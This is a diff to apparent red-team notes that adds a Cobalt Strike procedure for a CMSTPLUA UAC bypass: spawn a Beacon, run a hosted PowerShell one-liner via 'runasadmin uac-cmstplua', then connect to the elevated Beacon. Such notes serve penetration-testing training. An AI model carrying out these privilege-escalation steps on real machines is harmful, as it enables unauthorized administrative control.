@@ -82,3 +82,21 @@
 6.  Delete the gadget.
     
     1. rm data.bin
+
+### CMSTPLUA UAC Bypass
+
+For this bypass technique to work, the process in which our Beacon is running must live in _C:\Windows*_.
+
+1.  Spawn a new Beacon (this spawns in _C:\Windows\System32\rundll32.exe_ by default.)
+    
+    1. spawn x64 http
+2.  Host a PowerShell one-liner on the new Beacon.
+    
+    > Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.
+    
+3.  Run the provided one-liner via **runasadmin**.
+    
+    1. runasadmin uac-cmstplua [ONE-LINER]
+4.  Connect to the elevated Beacon.
+    
+    1. connect localhost 1337
